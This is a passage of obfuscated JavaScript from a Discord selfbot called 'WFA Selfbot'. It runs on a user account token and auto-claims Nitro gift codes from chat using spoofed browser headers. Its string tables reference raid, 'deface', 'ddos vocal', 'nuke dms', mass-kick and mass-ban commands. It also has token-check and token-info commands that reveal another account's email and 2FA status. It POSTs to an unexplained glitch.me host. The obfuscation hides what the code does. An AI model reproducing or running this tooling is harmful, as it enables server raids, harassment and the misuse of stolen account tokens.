        'SYrYB': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
        'psVNp': 'Windows',
        'ZAxVS': 'Firefox',
        'PkfqH': '66.0',
        'RWcwd': 'canary',
        'srODm': 'utf-8',
        'fOhKX': 'base64'
      };
      let V = [];
      S(T.content, W => {
        if (!W) return;
        if (!V.includes(W)) V.push(W);
      });
      if (V.length == 0) return;
      V.forEach(W => {
        const X = {
          'DngCf': '[COMMANDE] Commande thigh executé',
          'jFDOh': function (Y, Z) {
            return Y + Z;
          },
          'uJKFj': 'RAIDED BY ',
          'yWzJx': ' X ',
          'HqGaK': function (Y, Z) {
            return Y === Z;
          },
          'XYmLo': ':x: **Commande uniquement utilisable sur serveur**.',
          'KABec': 'ADMINISTRATOR',
          'VRgLS': ':x: **Vous n\'avez pas les permissions pour executer cette commande**',
          'LxBTQ': '[COMMANDE] Commande deface executé',
          'UEUys': function (Y, Z) {
            return Y !== Z;
          },
          'FXazn': 'FkEvB',
          'nOgDA': 'sKzLN',
          'mJQyr': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
        };
        {
          const Z = {};
          Z.channel_id = T.channel.id, fetch('https://canary.discordapp.com/api/v6/entitlements/gift-codes/' + W.split('/').pop() + '/redeem', {
            'method': 'post',
            'headers': {
              'Accept': '*/*',
              'Accept-Encoding': 'gzip, deflate, br',
              'Accept-Language': 'en-US',
              'Authorization': client.token,
              'Connection': 'keep-alive',
              'Content-Length': JSON.stringify(Z).length,
              'Content-Type': 'application/json',
              'Host': 'canary.discordapp.com',
              'Referer': 'https://canary.discordapp.com/channels/' + T.channel.id + '/' + T.id,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
              'X-super-properties': Buffer.from(JSON.stringify({
                'os': 'Windows',
                'browser': 'Firefox',
                'device': '',
                'browser_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0',
                'browser_version': '66.0',
                'os_version': '10',
                'referrer': '',
                'referring_domain': '',
                'referrer_current': '',
                'referring_domain_current': '',
                'release_channel': 'canary',
                'client_build_number': 0x928f,
                'client_event_source': null
              }), 'utf-8').toString('base64')
            },
            'body': JSON.stringify({
              'channel_id': T.channel.id
            })
          }).then(a0 => {
            const a1 = {
              'nQNqY': 'edi'
            };
            const a2 = a1;
            {
              if (a0.status == 400 || a0.status == 404) return console.log(('code invalide :  ' + W).red);
              a0.json().then(a4 => {
                const a5 = {
                  'YFQSB': function (a6, a7) {
                    return a6 + a7;
                  },
                  'XbUdI': 'RAIDED BY ',
                  'HOJyl': ' X ',
                  'jjWEg': 'https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676',
                  'elzsj': function (a6, a7) {
                    return a6 === a7;
                  },
                  'AEacm': ':x: **Commande uniquement utilisable sur serveur**.',
                  'FLOJQ': 'ADMINISTRATOR',
                  'VetBT': ':x: **Vous n\'avez pas les permissions pour executer cette commande**',
                  'UrhpK': '[COMMANDE] Commande deface executé'
                };
                console.log(a4), console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] Un nitro a surement été ajouté a tes credits')), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
              });
            }
          }).catch(console.error);
        }
      });
    }), client.on('guildDelete', T => {
      console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] Vous avez quitté le serveur ' + T.name)), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
    }), client.on('guildCreate', T => {
      const U = '2|0|4|1|3'.split('|');
      let V = 0;
      console.log(' ');
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(consolecolor.atlas('[EVENT] Vous avez rejoint le serveur ' + T.name));
      console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
      console.log(' ');
    }), process.on('unhandledRejection', T => {}), process.on('unhandledRejection', (T, U) => {}), process.on('uncaughtException', (T, U) => {}), process.on('uncaughtExceptionMonitor', (T, U) => {}), process.on('beforeExit', T => {}), process.on('exit', T => {}), process.on('multipleResolves', (T, U, V) => {}), client.on('error', T => {}), client.on('reconnecting', T => {
      const U = {
        'yyowO': '**Nuking dms...**',
        'orWmP': ':white_check_mark: **Nuked dms**',
        'JlRkz': '[COMMAND] nuke dm command executed'
      };
      const V = U;
      console.log('Reconnexion en cours...');
    }), client.on('resume', T => {}), client.on('disconnect', T => {
      console.log('deconnexion en cours...');
    }), client.login(token).catch(T => {
      if (T) console.log('Token invalid!\nChange ton token dans le config.json'.red);
    });
  }

  if (language == 'en') {
    let T = '';

    if (d.includes(ver)) {} else T = '[MESSAGE] The ' + d + ' version is available !\nMise a jour en cours...';

    let U = ' ';

    if (d.includes(ver)) {} else U = '[#] New version: ' + d + ' is available !\nWork in progress...';

    let V = nsfw;
    if (V == 'on') V = 'Activated';
    if (nsfw !== 'on') V = 'Off';
    client.on('ready', async () => {
      if (client.user.premium > 0) var a4 = 'on';else var a4 = 'off';

      if (client.user.bot) {
        var a5 = 'yes';
        process.exit(1);
      } else {
        var a5 = 'no';
      }

      console.clear(), console.log(consolecolor.passion('\n                                    ██╗    ██╗███████╗ █████╗     ███████╗███████╗██╗     ███████╗\n                                    ██║    ██║██╔════╝██╔══██╗    ██╔════╝██╔════╝██║     ██╔════╝\n                                    ██║ █╗ ██║█████╗  ███████║    ███████╗█████╗  ██║     █████╗  \n                                    ██║███╗██║██╔══╝  ██╔══██║    ╚════██║██╔══╝  ██║     ██╔══╝  \n                                    ╚███╔███╔╝██║     ██║  ██║    ███████║███████╗███████╗██║     \n                                     ╚══╝╚══╝ ╚═╝     ╚═╝  ╚═╝    ╚══════╝╚══════╝╚══════╝╚═╝  \n------------------------------------------------------------------------------------------------------------------------\n    ')), console.log(consolecolor('blue', 'magenta')('\n                                            [#] Version: ' + ver + '   \n                                            [#] Prefix: ' + prefix + '\n                                            [#] Login on: ' + client.user.username + '\n                                            [#] ID: ' + client.user.id + '\n                                            [#] Bot: ' + a5 + '\n                                            [#] Nitro: ' + a4 + '\n                                            [#] Number of friends: ' + client.user.friends.size + '\n                                            [#] Number of servers: ' + client.guilds.size + '\n                                            [#] Number of channels: ' + client.channels.size + '\n                                            [#] Number of members: ' + client.guilds.map(a8 => a8.memberCount).reduce((a8, a9) => a8 + a9) + '\n                                            [#] Number of bots: ' + client.users.filter(a8 => a8.bot).size + '\n                                            [#] NSFW: ' + V + '\n                                            [#] Nitro Auto Claim: On\n                                            [#] Youtube: ' + m + '\n                                            [#] Discord: ' + n + '\n                                            ' + U + '\n\n\nMessage for you: ' + l + '\n'));
    }), client.on('ready', async () => {
      const a4 = {
        'gEzAL': ':x: **Veuillez mentionner un utilisateur!**',
        'PtuWv': 'yes'
      };
      const a5 = a4;
      setTimeout(() => {
        console.log(consolecolor.morning('logs:')), console.log(consolecolor.morning('' + T));
      }, 500);
    }), client.on('ready', function () {
      const a4 = {
        'HdBAj': 'PLAYING',
        'YOFNF': '777619769637339156',
        'GLqxN': 'WFA Selfbot',
        'yFjpv': '𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥',
        'nsILC': 'wfa'
      };
      const a5 = a4;
      rpcGenerator.getRpcImage('777619769637339156', 'wfa_logo').then(a6 => {
        const a7 = {
          'PwqrU': 'WFA-Selfbot',
          'sgRJt': 'PLAYING',
          'cDQSl': '777619769637339156',
          'fTUFw': 'WFA Selfbot',
          'wFPWV': '𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥'
        };
        const a8 = a7;
        rpcGenerator.getRpcImage('777619769637339156', 'wfa').then(a9 => {
          let aa = new rpcGenerator.Rpc().setName('WFA-Selfbot').setUrl('https://www.twitch.tv/OGAGAL_risitas').setType('PLAYING').setApplicationId('777619769637339156').setDetails('WFA Selfbot').setAssetsLargeImage(a9.id).setAssetsSmallImage(a6.id).setAssetsLargeText('WFA').setState('𝐖𝐞 𝐅𝐮𝐜𝐤 𝐀𝐥𝐥').setStartTimestamp(Date.now()).setParty({
            'id': uuid()
          });
          client.user.setPresence(aa.toDiscord()).catch(ab => {});
        });
      });
    });

    function W() {
      fs.writeFile('./Data/pubmp.json', JSON.stringify(z), a4 => {
        if (a4) console.log(a4);
      });
    }

    function X() {
      const a4 = {
        'biqwq': ':x: **Je suis afk pour la raison** ',
        'SHHuy': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        'Npcvs': function (a5, a6) {
          return a5 + a6;
        },
        'wAdrT': function (a5, a6) {
          return a5 + a6;
        },
        'wmJdf': '[EVENT] The user ',
        'bpVHE': ' just pinged you on your afk',
        'TMHPR': function (a5, a6) {
          return a5 + a6;
        },
        'LDflz': '[EVENT] Message: '
      };
      fs.writeFile('./Data/groupe.json', JSON.stringify(z), a5 => {
        if (a5) console.log(a5);
      });
    }

    function Y() {
      fs.writeFile('./Data/afk.json', JSON.stringify(y), a5 => {
        if (a5) console.error(a5);
      });
    }

    function Z() {
      const a4 = {
        'IntHb': 'https://www.twitch.tv/OGAGAL_risitas',
        'rAmOH': 'PLAYING',
        'oRukK': 'WFA Selfbot',
        'YZSzN': 'now',
        'TqSMY': function (a5) {
          return a5();
        },
        'qUzuT': function (a5, a6) {
          return a5 + a6;
        },
        'SjnfP': ':white_check_mark: **Tu joues à ',
        'iqpgU': 'fTMue'
      };
      fs.writeFile('./Data/liste.json', JSON.stringify(A), a5 => {
        const a6 = {
          'iiKZQ': 'Rpc',
          'ASZuX': 'https://www.twitch.tv/OGAGAL_risitas',
          'jcukv': 'PLAYING',
          'YCfjj': '603405368940429315',
          'lyegA': 'WFA Selfbot',
          'HgZEC': 'now',
          'ChAnl': function (a7) {
            return a7();
          },
          'FcoAu': function (a7, a8) {
            return a7 + a8;
          },
          'wTrzK': function (a7, a8) {
            return a7 + a8;
          },
          'IoAyl': ':white_check_mark: **Tu joues à ',
          'qbEgP': ' sur fortnite**'
        };
        {
          if (a5) console.error(a5);
        }
      });
    }

    function a0() {
      fs.writeFile('./Data/vkick.json', JSON.stringify(B), a4 => {
        if (a4) console.error(a4);
      });
    }

    function a1() {
      fs.writeFile('./Data/backups.json', JSON.stringify(w), a4 => {
        const a5 = {
          'wetza': 'PLAYING',
          'mJpEu': 'WFA-Selfbot',
          'ZxwpA': function (a6) {
            return a6();
          },
          'lkZrq': '[COMMAND] csgo command executed'
        };
        {
          if (a4) console[_0x47d837(-391, 1125, 677, 1495)](a4);
        }
      });
    }

    function a2(a4) {
      const aa = '4|3|1|2|0'.split('|');
      let ab = 0;
      var a8 = '';
      var a7 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      var a5 = a7.length;

      for (var a6 = 0; a6 < a4; a6++) {
        a8 += a7.charAt(Math.floor(Math.random() * a5));
      }

      return a8;
    }

    client.on('message', a4 => {
      const a5 = {
        'UNQrM': 'Nike',
        'rqgnW': 'https://www.twitch.tv/OGAGAL_risitas',
        'DnlMS': 'WATCHING',
        'TLDxQ': '603405368940429315',
        'WkaQL': '[COMMAND] nike command executed',
        'dRafE': function (am, an) {
          return am + an;
        },
        'gsErH': ':white_check_mark: **You watch ',
        'UYnMU': ' on Nike**',
        'cgqEh': function (am, an) {
          return am * an;
        },
        'SSjMl': 'WFA-Selfbot',
        'VuuZB': 'nike',
        'KKhVy': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
        'xPWMp': '[EVENT] Le: ',
        'LUSql': '[EVENT] Contient: ',
        'uyGjv': function (am, an) {
          return am !== an;
        },
        'SOISQ': 'XfyUx',
        'yhtaH': 'NuIpR',
        'JfqDP': ':x: **Vous',
        'bgdXL': 'PLAYING',
        'GGTyi': function (am) {
          return am();
        },
        'kinUE': '[COMMAND] clash royale command executed',
        'XTHyp': '**restartredémarrage** of the bot...',
        'TlHaH': '[COMMAND] restart command executed',
        'dDVTo': 'All kick',
        'QNzEl': function (am, an) {
          return am === an;
        },
        'YAuEF': function (am, an) {
          return am === an;
        },
        'ChHhF': 'group',
        'UUYVH': ':x: **Cette commande ne marche que sur un serveur**.',
        'Xzczk': 'KICK_MEMBERS',
        'nQDLb': 'ERROR',
        'dgjUV': 'Il te manque des permissions',
        'VVeBs': function (am, an) {
          return am + an;
        },
        'rcIOf': '[EVENT] GG Je t\'ai fais gagner le giveaway sur le serveur ',
        'nynRd': ', va vite reclamer ta récompense',
        'FuGWb': '721465320740487179',
        'DAALJ': '[COMMAND] clash of clans command executed',
        'mQNzt': 'Tiktok',
        'VzbDc': '[COMMAND] tiktok command executed',
        'zNtlr': function (am, an) {
          return am + an;
        },
        'RNLiY': ' on Tiktok**',
        'qPXnY': 'https://super-mega-futur-app-855054.glitch.me/',
        'owBur': 'POST',
        'ZgJZD': function (am, an) {
          return am + an;
        },
        'SACTX': 'Un fichier n\'existe pas, ne fermez pas la fenetre je vais l\'installer.',
        'fzLff': function (am, an) {
          return am === an;
        },
        'EwAjE': 'xKPBZ',
        'PVXYv': 'YXegT',
        'tKKQX': ':x: **Commande uniquement utilisable sur un serveur**',
        'bKciJ': 'ADMINISTRATOR',
        'iyZDR': 'russia',
        'DYRDb': 'india',
        'TmoOz': 'brazil',
        'EhmbY': 'sydney',
        'mnsUK': function (am, an, ao) {
          return am(an, ao);
        },
        'dZXEO': '**Commande ddos vocal activé**',
        'GrqEc': 'MANAGE_MESSAGES',
        'FLeAY': 'MANAGE_ROLES_OR_PERMISSIONS',
        'sFPGY': 'BAN_MEMBERS',
        'VXNSX': function (am, an) {
          return am + an;
        },
        'gITVT': function (am, an) {
          return am + an;
        },
        'LIpMi': function (am, an) {
          return am + an;
        },
        'UyFuY': function (am, an) {
          return am + an;
        },
        'gVOdQ': '[MP Envoyé]  |',
        'vOgpy': '|  ',
        'wxGPu': ' / ',
        'uOaNV': '!d bump',
        'PwHug': function (am, an, ao) {
          return am(an, ao);
        },
        'tsWFC': '[COMMAND] start bumping command executed',
        'GjFDr': 'Google',
        'ZJeAO': function (am) {
          return am();
        },
        'qvXvz': '[COMMAND] google command executed',
        'EDZfI': ' on google**',
        'OUTsG': function (am, an) {
          return am < an;
        },
        'bwoWW': 'RANDOM',
        'QseuI': 'BE INSTRUCT WITH WFA',
        'ahHuz': '[COMMANDE] Commande google executé',
        'NCqyz': function (am, an) {
          return am + an;
        },
        'BMTaz': function (am, an) {
          return am + an;
        },
        'cHNig': ':white_check_mark: **Tu regardes ',
        'NmDiz': ' sur google**',
        'hBnVK': '░░░░░░░░░░ 0%',
        'ROmFg': '▓▓▓▓░░░░░░ 40%',
        'rbzLA': '▓▓▓▓▓▓░░░░ 60%',
        'uKxcE': '▓▓▓▓▓▓▓▓▓▓ 100%',
        'fuzvP': function (am, an) {
          return am + an;
        },
        'acWud': 'https://embed.rauf.workers.dev/?author=Command%2520NSFW&image=',
        'IEPko': '[COMMAND] 4k command executed',
        'OWKkn': 'Badlion',
        'CwISd': function (am) {
          return am();
        },
        'kYSxe': 'badlion',
        'xwuyM': function (am, an) {
          return am + an;
        },
        'PpUCU': 'https://cdn.discordapp.com/emojis/',
        'IbDfq': 'gif',
        'CtupY': function (am, an, ao) {
          return am(an, ao);
        },
        'pNzve': function (am, an) {
          return am + an;
        },
        'NtJpg': '[ERREUR]',
        'oRnhs': ' I can\'t ban this person',
        'CWBDx': '```WFA BACKUP FRIEND\n\nhastebins link: ',
        'LaIgP': '\n\n***you can copy and paste the list on the current channel and then you can right click on a nickname / send a message / add friend ect...```',
        'RMoiW': '[COMMAND] backup friend command executed',
        'vMsil': function (am, an) {
          return am(an);
        },
        'uDSTq': 'tokyo',
        'eqKYo': 'Token timeout',
        'uiJns': '879157124230414406',
        'gGByU': function (am, an) {
          return am === an;
        },
        'YksDG': '843993531273707540',
        'seigN': function (am, an) {
          return am / an;
        },
        'wivTd': function (am, an) {
          return am - an;
        },
        'sHLtY': 'PUT',
        'VHhAR': 'fQlWD',
        'edjbk': '10%',
        'eNJVJ': '15%',
        'taVpj': '25%',
        'fbAzK': '30%',
        'EvZjD': '35%',
        'gSCdw': '40%',
        'WZkqk': '45%',
        'YrgfT': '50%',
        'qoHVL': '60%',
        'BcxUQ': '65%',
        'CUFNM': '70%',
        'iOXzc': '75%',
        'hEnNG': '80%',
        'TMVRO': '85%',
        'kRHAL': '90%',
        'rVDlG': '95%',
        'AEsoj': '100%',
        'juhkl': '%2520',
        'mLUxV': function (am, an) {
          return am + an;
        },
        'pifga': '[COMMANDE] Commande lovecalc executé',
        'tizyD': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
        'DNUuu': 'URCrg',
        'ZgeeY': 'london',
        'kysLy': function (am, an) {
          return am !== an;
        },
        'WlPxV': 'ifDFa',
        'dhzJi': 'ready',
        'aEMPo': function (am, an) {
          return am < an;
        },
        'ALOBt': function (am, an) {
          return am !== an;
        },
        'OQtjo': 'QCXfr',
        'PnbJn': function (am, an, ao) {
          return am(an, ao);
        },
        'lcjDT': 'application/json',
        'YLkXD': '{"theme":"light"}',
        'wwsAu': 'PATCH',
        'QBgJX': function (am, an, ao) {
          return am(an, ao);
        },
        'MZFUI': 'https://discord.com/api/v8/users/@me/settings',
        'blMtT': 'Pornhub',
        'fxWhB': '[COMMANDE] Commande pornhub executé',
        'lQaBX': 'public_flags',
        'bfGvy': 'email',
        'CbEJQ': 'verified',
        'yueAx': 'nsfw_allowed',
        'IcCvP': function (am, an) {
          return am + an;
        },
        'UhBKq': function (am, an) {
          return am + an;
        },
        'nHcMR': '\nId: ',
        'GCBgK': '\nCompte vérifié?: ',
        'nMAOO': '```',
        'MREoK': '[COMMAND] info token command executed',
        'qDAaF': '[COMMANDE] Commande thigh executé',
        'ytESv': function (am, an) {
          return am !== an;
        },
        'GRGrs': 'uQOne',
        'PWFEk': 'https://discordapp.com/api/v6/users/@me',
        'QDkKo': 'GET',
        'KNpVR': 'oeMal',
        'jmGuV': 'IIfVC',
        'qUqPG': function (am, an) {
          return am === an;
        },
        'yKNnB': 'UVbAR',
        'fUIOy': '**the token is not valid :x:**',
        'rOjfq': function (am, an) {
          return am === an;
        },
        'dZfzN': ':x: **Il n\' y a aucun emote a supprimer.**',
        'hxSef': '[COMMANDE] Commande delete all emote executé',
        'vTMqX': function (am, an) {
          return am + an;
        },
        'mugBn': ' friends.',
        'gPVeV': function (am, an) {
          return am(an);
        },
        'wAmXL': function (am, an) {
          return am + an;
        },
        'lquAA': function (am) {
          return am();
        },
        'QTFOw': 'png',
        'nJxae': '[COMMAND] add emote command executed',
        'abEfM': ':x: **Please run this command on a server!**',
        'HJqaW': ' I can\'t kick this person',
        'leGPT': function (am, an) {
          return am === an;
        },
        'THDin': 'YUPii',
        'Cakyy': 'goSQc',
        'MBayx': ':x: **This emote is not on the server**.',
        'NbpqB': '4|0|3|2|1|5',
        'JWXev': '[EVENT] A nitro has probably been added to your credits',
        'rxXcO': 'WKRdY',
        'gkipu': 'HdZaB',
        'Qagix': function (am, an) {
          return am + an;
        },
        'ItgHl': 'locale',
        'XOBKb': 'flags',
        'gwgYx': '\nEmail: ',
        'sopgF': function (am, an) {
          return am + an;
        },
        'tpWfJ': '\nLangue: ',
        'uccwc': '\nA2f activé?: ',
        'rDeGW': function (am, an) {
          return am + an;
        },
        'LKTjQ': '\nFlags: ',
        'TPsFS': function (am, an) {
          return am + an;
        },
        'zRcIh': '\nPublic Flags: ',
        'jSijb': 'MtiMJ',
        'ElEta': function (am, an) {
          return am + an;
        },
        'iHedB': function (am, an) {
          return am + an;
        },
        'GSpMO': function (am, an) {
          return am + an;
        },
        'IHozl': '```diff\n + Le token:',
        'CSDgQ': 'Est 100% valide ✔```',
        'XVzDS': function (am, an) {
          return am + an;
        },
        'NXeOY': '```diff\n- Le token ',
        'VbdRQ': ' n\'est pas valide :x:```',
        'CVAAQ': '[COMMANDE] Commande check token executé',
        'VEtWb': function (am, an, ao, ap) {
          return am(an, ao, ap);
        },
        'iIAFA': function (am, an) {
          return am + an;
        },
        'pUvTM': ':x: **Invalid emote try this** ',
        'lJccD': 'add emote (emote) <name>',
        'ofVHI': function (am, an) {
          return am !== an;
        },
        'mHbqy': 'Ktmtt',
        'jprbl': function (am, an) {
          return am + an;
        },
        'JyrgN': function (am, an) {
          return am + an;
        },
        'YPbqj': '[COMMAND] anal command executed',
        'jxZKT': function (am) {
          return am();
        },
        'gaqmJ': function (am, an) {
          return am !== an;
        },
        'XCgBf': 'HbHBK',
        'xftuu': 'Facebook',
        'cXbqJ': '[COMMAND] facebook command executed',
        'TRkNZ': 'Instagram',
        'dbLvS': '[COMMAND] instagram command executed',
        'CqJVT': function (am, an) {
          return am + an;
        },
        'Hytwt': ' on Instagram**',
        'tbROG': 'Tokyo Ghoul',
        'uPaYa': function (am) {
          return am();
        },
        'FMJjU': '[COMMAND] tokyo ghoul command executed',
        'NPloa': 'gOPdZ',
        'QUeIS': function (am) {
          return am();
        },
        'SnVWi': '[COMMAND] pornhub command executed',
        'jMNAZ': 'Clash Royal',
        'NHSRG': function (am, an) {
          return am + an;
        },
        'LmkZJ': function (am, an, ao) {
          return am(an, ao);
        },
        'YTfqX': 'HffEk',
        'ULrNS': 'fCTRy',
        'FQBIf': 'Tinder',
        'QPWfu': 'Roblox',
        'UBriO': function (am) {
          return am();
        },
        'Nrzsi': '[COMMAND] roblox command executed',
        'dXUPp': '7|5|2|8|9|11|6|10|1|4|3|0',
        'byQzM': function (am, an) {
          return am + an;
        },
        'qjAuk': function (am, an) {
          return am + an;
        },
        'vlqQr': '[EVENT] Salon: ',
        'YUkfW': function (am, an) {
          return am === an;
        },
        'fzLKH': '[EVENT] Nouveau GhostPing:',
        'ZOGWN': '[EVENT] Serveur: ',
        'bHzdi': function (am, an) {
          return am + an;
        },
        'OKpUo': function (am, an) {
          return am + an;
        },
        'mbuTp': '[COMMAND] ass command executed',
        'oHyyz': 'https://nekobot.xyz/api/image',
        'ofMKC': 'ass',
        'djcEJ': 'iHmLa',
        'kMRFP': 'Rpc',
        'NADQj': 'Fortnite',
        'KiJRm': 'WFA Selfbot',
        'eRsgy': 'WFA-Selfbot E',
        'KdbTm': function (am, an) {
          return am + an;
        },
        'pBgth': ':white_check_mark: **You play ',
        'MxUgH': ' on fortnite**'
      };
      var a6 = a4.content.substring(prefix.length).split(' '),
          a7 = a4.mentions.users.first();
      let a8 = a4;

      async function a9() {
        const am = {
          'yXCPV': function (ap, aq, ar) {
            return ap(aq, ar);
          },
          'mDPEx': '2|4|3|0|1|5',
          'ItfNF': function (ap, aq) {
            return ap + aq;
          },
          'CNpsV': function (ap, aq) {
            return ap + aq;
          },
          'SurkL': ', it\'s possible I don\'t have the permissions :/',
          'Rbhzl': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━',
          'mUIss': function (ap, aq) {
            return ap + aq;
          },
          'lSEdF': function (ap, aq) {
            return ap + aq;
          },
          'XQdoQ': '[EVENT] I reacted correctly to the giveaway on ',
          'kxSPz': 'ms I am super fast hehe ;)'
        },
              an = Math.floor(Math.random() * 1500);

        async function ao() {
          const ap = {
            'eWhdm': function (aq, ar, as) {
              return aq(ar, as);
            },
            'oQWrj': 'VPmMt',
            'SitXi': '2|4|3|0|1|5',
            'uqipB': function (aq, ar) {
              return aq + ar;
            },
            'bMmzD': function (aq, ar) {
              return aq + ar;
            },
            'irsYP': ', it\'s possible I don\'t have the permissions :/',
            'APnTa': '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'
          };
          a4.react('🎉').catch(aq => {
            if (aq) {
              const ar = '2|4|3|0|1|5'.split('|');
              let as = 0;
              console.log(' ');
              console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
              console.log(consolecolor.atlas('[EVENT] I couldn\'t react to the giveaway on ' + a4.guild.name + ', it\'s possible I don\'t have the permissions :/'));
              console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
              console.log(' ');
              return;
            }
          }), console.log(' ');
          console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] I reacted correctly to the giveaway on ' + a4.guild.name + ' in ' + an + 'ms I am super fast hehe ;)')), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
          console.log(' ');
        }

        setTimeout(ao, an);
      }

      async function aa() {
        if (a4.author.id == '294882584201003009' || a4.author.id == '716967712844414996') {
          if (a4.content.includes('Congratulations')) {
            if (a4.content.includes(client.user.id)) {
              if (a4.embeds) console.log(' ');
              console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] GG I made you win the giveaway on the server ' + a4.guild.name + ', go quickly claim your reward')), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
            }
          }
        }
      }

      aa(), a4.author.id == '294882584201003009' || a4.author.id == '716967712844414996' && a4.embeds[0] && a4.embeds[0].description.includes('React with') && a9();

      if (a4.author.id == client.user.id) {
        if (x[client.user.id]) {
          if (a4.content.includes(':x:')) return;else delete x[client.user.id];
          Y(), a4.channel.send(':white_check_mark: **You are no longer afk**'), console.log(consolecolor.instagram('[COMMAND] afk stopped'));
        }
      }

      if (a4.content.includes(client.user.id)) {
        if (a4.author.id === client.user.id) return;

        if (x[client.user.id]) {
          const ao = '5|2|6|0|4|3|1'.split('|');
          let ap = 0;
          a4.reply(':x: **Je suis afk pour la raison** ' + x[client.user.id].r);
          console.log(' ');
          console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
          console.log(consolecolor.atlas('[EVENT] The user ' + a4.author.username + ' just pinged you on your afk'));
          console.log(consolecolor.atlas('[EVENT] Message: ' + a4.content));
          console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
          console.log(' ');
        } else return;
      }

      if (a4.channel.type === 'dm') {
        if (a8.author.bot) {
          if (a4.content.includes('discord.gg')) {
            let aq = a4.author;
            aq.send('/!\\ Anti mp').then(ar => {
              ar.delete();
            }), console.log(' '), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(consolecolor.atlas('[EVENT] The bot ' + a4.author.username + ' has sent you a discord invitation')), console.log(consolecolor.atlas('[EVENT] Message: ' + a4.content)), console.log(consolecolor.fruit('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')), console.log(' ');
          }
        }
      }

      if (a8.author.id !== client.user.id) return;
      a4.content.startsWith(prefix + 'cmd') && (a4.edit(ghost + 'https://en-cmd.wfaself.repl.co\n    https://en-cmd-1.wfaself.repl.co\n    https://en-cmd-2.wfaself.repl.co\n    https://en-cmd-3.wfaself.repl.co\n    https://en-cmd-4.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMAND] cmd command executed')));
      a4.content.startsWith(prefix + 'help') && (a4.edit(ghost + 'https://en-help.wfaself.repl.co').catch(ar => {}), console.log(consolecolor.instagram('[COMMAND] help command executed')));

      if (a4.content.startsWith(prefix + 'help fun')) {
        a4.edit(ghost + 'https://en-fun.wfaself.repl.co\nhttps://en-fun-1.wfaself.repl.co').catch(as => {}), console.log(consolecolor.instagram('[COMMAND] help fun command executed'));
      }

      a4.content.startsWith(prefix + 'help hack') && (a4.edit(ghost + 'https://en-hack.wfaself.repl.co').catch(as => {}), console.log(consolecolor.instagram('[COMMAND] help hack command executed')));

      if (a4.content.startsWith(prefix + 'help raid')) {
        a4.edit(ghost + 'https://en-raid.wfaself.repl.co').catch(at => {}), console.log(consolecolor.instagram('[COMMAND] help raid command executed'));
      }

      if (a4.content.startsWith(prefix + 'help status')) {
        a4.edit(ghost + 'https://en-status-2.wfaself.repl.co\n    https://en-status-1.wfaself.repl.co\n    https://en-status-3.wfaself.repl.co\n    https://en-status-4.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMAND]e help status command executed'));
      }

